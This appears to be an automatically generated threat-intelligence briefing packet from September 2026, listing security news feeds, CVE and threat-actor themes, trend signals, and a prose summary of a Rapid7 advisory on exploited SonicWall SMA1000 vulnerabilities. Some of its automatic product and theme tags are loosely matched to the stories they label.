# PHANTOMSignal Briefing Packet

- Generated: 2026-09-03T13:28:45.293379+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 74
- Total items in window: 319
- Total clusters raw: 150
- Total clusters in packet: 68
- Dropped low score: 82
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 4
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 21
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 1
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 6
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 9
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 13
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 15
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 24
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 17
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 14
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### CVE-2026-82078 exploitation activity
- Anchor signal: CVE-2026-82078
- Theme key: cve-2026-82078
- Cluster count: 4
- Article count: 5
- Cohesion: 0.309
- Shared strong signals: CVE-2026-82078
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, ransomware_extortion, zero_day, phishing_social_eng
  - affected_industries: critical_infrastructure
  - affected_products: OpenAI/ChatGPT
  - cve_ids: CVE-2026-81578, CVE-2026-82078, CVE-2023-27350
  - urgency_signals: actively_exploited, zero_day, emergency_patch, preauth_unauth, critical_cvss
- Cluster IDs: 69f95d6a80, 220df2cac2, 205332731c, e57f34f6e2
- Links:
  - https://www.rapid7.com/blog/post/etr-papercut-ng-mf-critical-zero-day-exploited-in-the-wild
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-81578-cve-2026-82078/
  - https://www.huntress.com/blog/papercut-actively-exploited
  - https://thehackernews.com/2026/08/papercut-zero-day-exploited-in-attacks.html
  - https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/

### CVE-2026-81578 exploitation activity
- Anchor signal: CVE-2026-81578
- Theme key: cve-2026-81578
- Cluster count: 4
- Article count: 5
- Cohesion: 0.309
- Shared strong signals: CVE-2026-81578
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, ransomware_extortion, zero_day, phishing_social_eng
  - affected_industries: critical_infrastructure
  - affected_products: OpenAI/ChatGPT
  - cve_ids: CVE-2026-81578, CVE-2026-82078, CVE-2023-27350
  - urgency_signals: actively_exploited, zero_day, emergency_patch, preauth_unauth, critical_cvss
- Cluster IDs: 69f95d6a80, 220df2cac2, 205332731c, e57f34f6e2
- Links:
  - https://www.rapid7.com/blog/post/etr-papercut-ng-mf-critical-zero-day-exploited-in-the-wild
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-81578-cve-2026-82078/
  - https://www.huntress.com/blog/papercut-actively-exploited
  - https://thehackernews.com/2026/08/papercut-zero-day-exploited-in-attacks.html
  - https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/

### ransomware extortion targeting WordPress
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 5
- Article count: 7
- Cohesion: 0.218
- Shared strong signals: WordPress
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, data_breach
  - affected_industries: critical_infrastructure
  - affected_products: WordPress
  - urgency_signals: preauth_unauth, no_patch_yet
- Cluster IDs: d5d207ddf7, 9da7ae98ee, c58d4818a7, f5aaf423ba, d19603372e
- Links:
  - https://www.exploit-db.com/exploits/52668
  - https://www.securityweek.com/cisco-warns-of-unpatched-secure-email-flaws-patches-critical-switch-vulnerabilities/
  - https://www.securityweek.com/over-3-million-wordpress-sites-affected-by-migration-plugin-vulnerability/
  - https://thehackernews.com/2026/08/five-critical-wordpress-plugin-and.html
  - https://www.bleepingcomputer.com/news/security/wordpress-backup-plugin-flaw-exposes-millions-of-sites-to-takeover-attacks/
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-payloads-exploits-scanners
  - https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency

### SonicWall active exploitation
- Anchor signal: SonicWall
- Theme key: sonicwall
- Cluster count: 2
- Article count: 8
- Cohesion: 0.2
- Shared strong signals: SonicWall
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: SonicWall
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: 12b308ba06, 9da7ae98ee
- Links:
  - https://www.rapid7.com/blog/post/etr-critical-sonicwall-sma1000-vulnerabilities-cve-2026-83548-cve-2026-83549-exploited-in-the-wild
  - https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-actively-exploited-sma1000-zero-day-flaws/
  - https://www.darkreading.com/vulnerabilities-threats/sonicwall-sma-1000-zero-days-unauthenticated-rce
  - https://www.infosecurity-magazine.com/news/hackers-chain-sonicwall-zeroday/
  - https://thehackernews.com/2026/09/cisa-adds-seven-exploited-flaws-as.html
  - https://www.sophos.com/en-us/blog/sonicwall-83548-83549
  - https://www.securityweek.com/cisco-warns-of-unpatched-secure-email-flaws-patches-critical-switch-vulnerabilities/

### Apple iOS/macOS vulnerability activity
- Anchor signal: Apple iOS/macOS
- Theme key: apple-ios-macos
- Cluster count: 4
- Article count: 7
- Cohesion: 0.2
- Shared strong signals: Apple iOS/macOS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_industries: financial_services
  - affected_products: Apple iOS/macOS
- Cluster IDs: 5256c45f71, 0a5e1245be, c0456846cc, 8e0b5344fa
- Links:
  - https://www.bleepingcomputer.com/news/security/hackers-exploit-critical-jfrog-artifactory-flaw-to-forge-admin-tokens/
  - https://www.darkreading.com/application-security/attackers-pounce-critical-artifactory-flaw-disclosure
  - https://thehackernews.com/2026/09/attackers-exploit-critical-jfrog.html
  - https://securelist.com/mirage-kitten-new-backdoors-noderabbit-pollcat/121244/
  - https://thehackernews.com/2026/09/13-malicious-packagist-packages-target.html
  - https://www.reddit.com/r/netsec/comments/1w5l1j8/rooted_in_trust_three_privilegeescalation/
  - https://thehackernews.com/2026/09/iranian-hackers-pose-as-recruiters-to.html

### Gitea active exploitation
- Anchor signal: Gitea
- Theme key: gitea
- Cluster count: 3
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: Gitea
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: phishing_social_eng, zero_day, active_exploitation
  - affected_industries: critical_infrastructure, manufacturing_industrial
  - affected_products: Gitea, GitLab
  - urgency_signals: preauth_unauth, actively_exploited, zero_day
- Cluster IDs: 205332731c, 9f4e218d51, 5256c45f71
- Links:
  - https://thehackernews.com/2026/08/papercut-zero-day-exploited-in-attacks.html
  - https://thehackernews.com/2026/09/pegasus-zero-click-spyware-exploit.html
  - https://www.bleepingcomputer.com/news/security/hackers-exploit-critical-jfrog-artifactory-flaw-to-forge-admin-tokens/
  - https://www.darkreading.com/application-security/attackers-pounce-critical-artifactory-flaw-disclosure
  - https://thehackernews.com/2026/09/attackers-exploit-critical-jfrog.html

### ransomware extortion targeting Android
- Anchor signal: Android
- Theme key: android
- Cluster count: 2
- Article count: 2
- Cohesion: 0.697
- Shared strong signals: Android
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion
  - affected_industries: financial_services
  - affected_products: Android, OpenAI/ChatGPT
- Cluster IDs: bbea7197be, 96362ad42a
- Links:
  - https://research.checkpoint.com/2026/gaming-the-system-how-a-chinese-speaking-actor-turned-brazilian-government-sites-into-an-seo-weapon/
  - https://research.checkpoint.com/2026/breaking-the-seal-static-deobfuscation-of-jsceals-compiled-v8-bytecode/

### Microsoft Defender vulnerability activity
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 2
- Article count: 6
- Cohesion: 0.2
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Microsoft Defender
- Cluster IDs: 1946cdc3c5, 6719361d31
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/09/02/impersonating-it-support-threat-actors-turn-remote-session-into-enterprise-wide-access/
  - https://thehackernews.com/2026/09/fake-software-installers-disable.html
  - https://thehackernews.com/2026/09/researcher-releases-falconflank-poc.html

### ShinyHunters targeting Salesforce
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 2
- Article count: 3
- Cohesion: 0.39
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, phishing_social_eng
  - actor_attribution: ShinyHunters
  - affected_industries: healthcare
  - affected_products: Salesforce
- Cluster IDs: e57f34f6e2, 0a3458104e
- Links:
  - https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/
  - https://cyberscoop.com/mckesson-data-theft-extortion-attack-shinyhunters/
  - https://www.infosecurity-magazine.com/news/healthcare-mckesson-investigates/

### Palo Alto Networks vulnerability activity
- Anchor signal: Palo Alto Networks
- Theme key: palo-alto-networks
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: Palo Alto Networks
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Palo Alto Networks
- Cluster IDs: eae1569c42, f5aaf423ba
- Links:
  - https://unit42.paloaltonetworks.com/spring-ring-voice-phishing-campaigns/
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-payloads-exploits-scanners

## Forward signals

### Novelty
- Novel cves: 6
  - CVE-2026-20212 (first seen via SecurityWeek at 2026-09-03T10:30:00+00:00, cluster 9da7ae98ee)
  - CVE-2026-20274 (first seen via SecurityWeek at 2026-09-03T10:30:00+00:00, cluster 9da7ae98ee)
  - CVE-2026-20279 (first seen via SecurityWeek at 2026-09-03T10:30:00+00:00, cluster 9da7ae98ee)
  - CVE-2026-20354 (first seen via SecurityWeek at 2026-09-03T10:30:00+00:00, cluster 9da7ae98ee)
  - CVE-2026-20355 (first seen via SecurityWeek at 2026-09-03T10:30:00+00:00, cluster 9da7ae98ee)
  - CVE-2026-19949 (first seen via SecurityWeek at 2026-09-03T10:40:00+00:00, cluster c58d4818a7)
- Novel actors: 0
- Novel products: 0

### Velocity bursts (2)
- **Critical Langflow flaw exploited to steal OpenAI and AWS keys**
  - Cluster: a8ec64c446
  - Sources in window: 3
  - Window hours: 2.9
  - Cohort count: 3
- **Financially Motivated Threat Actor BREEZE COMET Targets Brazil**
  - Cluster: 25cdc2e4b7
  - Sources in window: 3
  - Window hours: 3.3
  - Cohort count: 3

### Leading edge (0)

### Convergence (15)
- Pair: CVE-2026-83548 + SonicWall (cluster 12b308ba06, first observation: True)
- Pair: CVE-2026-83549 + SonicWall (cluster 12b308ba06, first observation: True)
- Pair: CVE-2026-81578 + Anthropic/Claude (cluster 220df2cac2, first observation: True)
- Pair: CVE-2026-81578 + OpenAI/ChatGPT (cluster 220df2cac2, first observation: True)
- Pair: CVE-2026-82078 + Anthropic/Claude (cluster 220df2cac2, first observation: True)
- Pair: CVE-2026-82078 + OpenAI/ChatGPT (cluster 220df2cac2, first observation: True)
- Pair: CVE-2026-15013 + WordPress (cluster d5d207ddf7, first observation: True)
- Pair: CVE-2021-31886 + Anthropic/Claude (cluster 3f9d82bc63, first observation: True)
- Pair: CVE-2021-31886 + OpenAI/ChatGPT (cluster 3f9d82bc63, first observation: True)
- Pair: CVE-2026-20212 + SonicWall (cluster 9da7ae98ee, first observation: True)
- Pair: CVE-2026-20212 + WordPress (cluster 9da7ae98ee, first observation: True)
- Pair: CVE-2026-20274 + SonicWall (cluster 9da7ae98ee, first observation: True)
- Pair: CVE-2026-20274 + WordPress (cluster 9da7ae98ee, first observation: True)
- Pair: CVE-2026-20279 + SonicWall (cluster 9da7ae98ee, first observation: True)
- Pair: CVE-2026-20279 + WordPress (cluster 9da7ae98ee, first observation: True)

### Drift (5)
- **Cl0p** (cluster 205332731c)
  - New industries: critical_infrastructure
  - New products: GitLab, Gitea
  - Prior top industries: financial_services, government, manufacturing_industrial
  - Prior top products: Microsoft SharePoint, OpenAI/ChatGPT, SolarWinds
- **LockBit** (cluster 205332731c)
  - New industries: manufacturing_industrial
  - New products: (none)
  - Prior top industries: critical_infrastructure, financial_services, government
  - Prior top products: GitLab, Gitea, OpenAI/ChatGPT
- **TeamPCP** (cluster 205332731c)
  - New industries: critical_infrastructure, manufacturing_industrial
  - New products: GitLab, Gitea, OpenAI/ChatGPT
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: GitHub, Kubernetes, npm
- **APT29** (cluster eae1569c42)
  - New industries: (none)
  - New products: Palo Alto Networks
  - Prior top industries: aviation_defense, government
  - Prior top products: Microsoft Entra, PyPI, SolarWinds
- **ShinyHunters** (cluster e57f34f6e2)
  - New industries: healthcare
  - New products: Okta, Ubiquiti UniFi
  - Prior top industries: education, financial_services, government
  - Prior top products: Anthropic/Claude, Microsoft Entra, Salesforce

### Persistence (15)
- actor_attribution: ShinyHunters (weeks observed: 14, cluster e57f34f6e2)
- actor_attribution: Cl0p (weeks observed: 9, cluster 205332731c)
- actor_attribution: TeamPCP (weeks observed: 9, cluster 205332731c)
- cve_ids: CVE-2026-33017 (weeks observed: 8, cluster a8ec64c446)
- actor_attribution: LockBit (weeks observed: 7, cluster 205332731c)
- actor_attribution: APT29 (weeks observed: 6, cluster eae1569c42)
- cve_ids: CVE-2026-50656 (weeks observed: 6, cluster 6719361d31)
- cve_ids: CVE-2026-0770 (weeks observed: 4, cluster a8ec64c446)
- cve_ids: CVE-2026-55255 (weeks observed: 4, cluster a8ec64c446)
- actor_attribution: APT28 (weeks observed: 4, cluster 713e97e0d2)
- cve_ids: CVE-2026-42897 (weeks observed: 3, cluster 535b833320)
- cve_ids: CVE-2026-5027 (weeks observed: 3, cluster a8ec64c446)
- cve_ids: CVE-2026-66066 (weeks observed: 3, cluster a8ec64c446)
- cve_ids: CVE-2026-42271 (weeks observed: 3, cluster a6bf88aa80)
- actor_attribution: Nimbus Manticore (weeks observed: 3, cluster 8e0b5344fa)

### Tier inversion (2)
- **Researchers Use Claude to Port Pre-Auth RCE Exploit From One PLC Model to Another**
  - Cluster: 3f9d82bc63
  - Primary source: The Hacker News
  - Strong signals: CVE-2021-31886
- **Rooted in Trust: Three privilege-escalation vulnerabilities in HP Easy Start for macOS (CVE-2026-12554, CVE-2026-12555, CVE-2026-12556)**
  - Cluster: 8e0b5344fa
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-12554, CVE-2026-12555, CVE-2026-12556, Nimbus Manticore

## Clusters

### Cluster 12b308ba06 — score 69

- Title: Critical SonicWall SMA1000 Vulnerabilities CVE-2026-83548, CVE-2026-83549 Exploited in the Wild
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-02T16:58:45+00:00
- Link: https://www.rapid7.com/blog/post/etr-critical-sonicwall-sma1000-vulnerabilities-cve-2026-83548-cve-2026-83549-exploited-in-the-wild
- Fetch status: ok
- Member count: 7
- Corroborating source count: 6
- Strong signals: CVE-2026-83548, CVE-2026-83549, SonicWall

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: financial_services
- affected_products: SonicWall
- cve_ids: CVE-2026-83548, CVE-2026-83549
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: SonicWall
- cve_ids: CVE-2026-83548, CVE-2026-83549
- urgency_signals: actively_exploited, preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On September 1, 2026, SonicWall disclosed two vulnerabilities affecting SonicWall SMA1000 appliances that the vendor says are being actively exploited in the wild. The vulnerabilities, CVE-2026-83548 and CVE-2026-83549 , can be chained to achieve unauthenticated remote code execution (RCE) on affected appliances. CVE-2026-83548 is a critical pre-authentication server-side request forgery (SSRF) vulnerability in the SMA1000 Appliance Work Place interface. The flaw has a CVSS v3.1 base score of 10.0 and can allow a remote, unauthenticated attacker to access sensitive functionality and perform unauthorized operations through an unintended alternate access path. CVE-2026-83549 is a high-severity OS command injection vulnerability in the Appliance Management Console (AMC). On its own, exploitation requires an authenticated administrator and specific system conditions. Although, by leveraging the SSRF vulnerability CVE-2026-83548 an attacker could potentially exploit CVE-2026-83549
```

#### Full body

```
